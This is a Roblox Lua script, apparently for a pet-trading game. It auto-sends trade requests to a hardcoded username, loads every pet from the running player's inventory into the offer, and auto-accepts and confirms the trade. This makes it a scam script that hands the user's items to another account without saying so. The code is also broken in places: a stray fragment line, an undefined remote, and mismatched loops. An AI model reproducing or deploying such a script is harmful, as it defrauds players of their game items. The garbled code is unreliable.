local Bypass = require(game.ReplicatedStorage.Fsys).load
local RouterClient = Bypass("RouterClient")
local SendTradeRequestRemote = RouterClient.get("TradeAPI/SendTradeRequest")
AddItemToOffer")
local AcceptNegotiationRemote = RouterClient.get("TradeAPI/AcceptNegotiation")
local ConfirmTradeRemote = RouterClient.get("TradeAPI/ConfirmTrade")

Username = "normalplayermph"

local function AutoSendTradeRequest()
  while true do
      if not Bypass("ClientData").get_data()[Username].in_active_trade then
          print("Sending trade request to "..Username)
          SendTradeRequestRemote:FireServer(game.Players[Username])
          task.wait(1)
      else
          break
      end
  end
end
while true do
local playerData = Bypass("ClientData").get_data()[game.Players.LocalPlayer]
if not playerData.in_active_trade then
  AutoSendTradeRequest()
task.wait(0.1)
end


local function AutoAddPets()
while true do
  local playerData = Bypass("ClientData").get_data()[game.Players.LocalPlayer]
  if playerData.in_active_trade then
    local inventory = playerData.inventory
    if inventory and inventory.pets then
      for petUid in pairs(inventory.pets) do
        AddPetRemote:FireServer(petUid)
      end
    else
      print("No pets found in inventory.")
    end
    if #playerData.trade.sender_offer.items >= 18 then
      break
    end
  end
  task.wait(0.1)
end
end
while true do
local playerData = Bypass("ClientData").get_data()[game.Players.LocalPlayer]
if playerData.in_active_trade then
  AutoAddPets()
end
task.wait(0.1)
end

local function AutoAcceptAndConfirm()
while true do
if Bypass("ClientData").get_data()[Username].in_active_trade then
  if Bypass("ClientData").get_data()[Username].trade.sender_offer.negotiated then
    print("Accepted Negotioation For "..Username)
    AcceptNegotiationRemote:FireServer()
  end
  if Bypass("ClientData").get_data()[Username].trade.sender_offer.confirmed then
    print("Confirmed Trade For "..Username)
    ConfirmTradeRemote:FireServer()
    end
  end
end
end
while true do
local playerData = Bypass("ClientData").get_data()[game.Players.LocalPlayer]
if playerData.in_active_trade then
  AutoAcceptAndConfirm()
end
task.wait(0.1)
end
